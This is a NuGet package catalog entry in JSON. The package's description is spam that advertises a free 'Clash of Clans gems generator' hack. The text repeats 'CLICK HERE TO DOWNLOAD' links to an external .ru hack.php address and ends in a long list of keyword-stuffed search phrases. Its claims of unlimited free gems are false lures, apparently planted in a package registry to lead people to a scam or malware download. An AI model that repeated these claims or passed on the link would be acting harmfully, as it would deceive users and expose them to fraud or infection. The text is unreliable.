{
  "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.29.00.00.28/_clash-of-clans-gems-generator-working-2022-version-lev.3.1.15.json",
  "@type": [
    "PackageDetails",
    "catalog:Permalink"
  ],
  "authors": "SharpCrafters s.r.o.",
  "catalog:commitId": "553ec314-3469-45b5-84dd-b57a4f1cb4f5",
  "catalog:commitTimeStamp": "2022-01-29T00:00:28.9377769Z",
  "created": "2022-01-26T16:18:00.237Z",
  "description": "# _Clash Of Clans Gems Generator Working 2022 Version lev\n\n\nCLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; [http://10.bltadwin.ru/hack.php](http://10.bltadwin.ru/hack.php)\n\n\nActually Clash of Clans Online Generator and Clash Of Clans gems generator is an online tool that helps you to generate unlimited free Clash of. We created this Clash of Clans Gems Generator Hack with good purposes to those have difficulty on money and want to play game as many others since gems are. CLASH OF CLANS FREE GEMS, CLASH OF CLANS FREE GOLD, FREE GEMS CLASH OF CLANS, CLASH OF CLANS GENERATOR, CLASH OF CLANS SPIN ELIXIRS, CLASH OF CLANS FREE.\n\n## [CLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; http://10.bltadwin.ru/hack.php](http://10.bltadwin.ru/hack.php)\n\nClash of Clans is still one of the most popular mobile download of clans gems generator is a private tool for generating unlimited gems, coins, and elixir for the newbie or pro players. it has an updated server and the user interface are responsive for all device. It’s working 24hrs and updated weekly.  · Clash Of Clans Gems Generator No Human Verification. Get unlimited Free Gems for Clash of Clans in with this new Generator! Clash of Clans is still one of the most popular mobile download  · Thanks to Clash of Clans Cheats you can generate selected amount of Gems directly from your browser for Android and iOS Game. Use it to generate Clash of Clans gems! As you see, you do not have to download any hacks, cheats, coins, gems generators, bots, keygens or other programs of this type. download is all you need!Estimated Reading Time: 3 mins.\n\nclash of clans gems generator 2021, clash of clans gems generator without human verification, clash of clans gems generator free 2021, clash of clans gems generator apk, can we get free gems in coc, clash of clans gems generator 2022, clash of clans gems generator 2020, clash of clans gems generator no human verification, clash of clans gems generator online, clash of clans gems generator apk download, clash of clans gems generator android, clash of clans hack gems generator android, clash of clans gem generator that actually works, clash of clans generator gems gold and elixir, clash of clans gems generator unlimited gems coins and elixir, clash of clans coins and gems generator, clash of clans gems generator no verification, clash of clans gems generator.blogspot.com, clash of clans gem generator.com, clash of clans gems and coins generator, cheat clash of clans gems generator online, clash of clans coins and gems generator without human verification, clash of clans unlimited gems and coins generator, clash of clans gems generator unlimited gems coins and elixir generator, clash of clans gems generator free, clash of clans gems generator download, clash of clans gems generator download apk, clash of clans unlimited coins and gems generator download, clash of clans hack gems generator free download, does clash of clans gem generator work, clash of clans gems gold and elixir generator no survey, clash of clans gems cheat and resources generator easy to use.zip, clash of clans hack gold elixir gems generator, clash of clans coins elixir and gems generator, clash of clans online generator gems gold and elixir, generator gems clash of clans, clash of clans free gems generator without human verification, clash of clans free gems generator 2020, free clash of clans gems generator no survey, clash of clans free gems generator online no survey, clash of clans free gems generator online, free clash of clans gems generator, clash of clans gems hack game guardian, clash of clans online generator gems gold, clash of clans unlimited gems hack game download, clash of clans gems gems generator, clash of clans gems and gold hack, clash of clans unlimited gems or gold generator, clash of clans gems hack hindi, clash of clans gem generator no human verification or survey, clash of clans gems hack generator, clash of clans gems hack no human verification, clash of clan",
  "id": "_Clash-Of-Clans-Gems-Generator-Working-2022-Version-lev",
  "isPrerelease": false,
  "language": "en-US",
  "lastEdited": "2022-01-28T23:45:42.82Z",
  "listed": false,
  "packageHash": "U5nRnHuOtjsv5M8Q+p5nXUdLwN3NRuQ+Ib8+A44AX9NAX+lJ7p8q6dcAQjNvjKyXNewRF9k8rIzSVud7JtXwVQ==",
  "packageHashAlgorithm": "SHA512",
  "packageSize": 11422,
  "published": "1900-01-01T00:00:00Z",
  "requireLicenseAcceptance": false,
  "title": "_Clash-Of-Clans-Gems-Generator-Working-2022-Version-lev",
  "verbatimVersion": "3.1.15",
  "version": "3.1.15",
  "packageEntries": [
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.29.00.00.28/_clash-of-clans-gems-generator-working-2022-version-lev.3.1.15.json#jqfcbevwzb.nuspec",
      "@type": "PackageEntry",
      "compressedLength": 1295,
      "fullName": "jqfcbevwzb.nuspec",
      "length": 4485,
      "name": "jqfcbevwzb.nuspec"
    },
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.29.00.00.28/_clash-of-clans-gems-generator-working-2022-version-lev.3.1.15.json#.signature.p7s",
      "@type": "PackageEntry",
      "compressedLength": 9467,
      "fullName": ".signature.p7s",
      "length": 9467,
      "name": ".signature.p7s"
    }
  ],
  "@context": {
    "@vocab": "http://schema.nuget.org/schema#",
    "catalog": "http://schema.nuget.org/catalog#",
    "xsd": "http://www.w3.org/2001/XMLSchema#",
    "dependencies": {
      "@id": "dependency",
      "@container": "@set"
    },
    "dependencyGroups": {
      "@id": "dependencyGroup",
      "@container": "@set"
    },
    "packageEntries": {
      "@id": "packageEntry",
      "@container": "@set"
    },
    "packageTypes": {
      "@id": "packageType",
      "@container": "@set"
    },
    "supportedFrameworks": {
      "@id": "supportedFramework",
      "@container": "@set"
    },
    "tags": {
      "@id": "tag",
      "@container": "@set"
    },
    "vulnerabilities": {
      "@id": "vulnerability",
      "@container": "@set"
    },
    "published": {
      "@type": "xsd:dateTime"
    },
    "created": {
      "@type": "xsd:dateTime"
    },
    "lastEdited": {
      "@type": "xsd:dateTime"
    },
    "catalog:commitTimeStamp": {
      "@type": "xsd:dateTime"
    },
    "reasons": {
      "@container": "@set"
    }
  }
}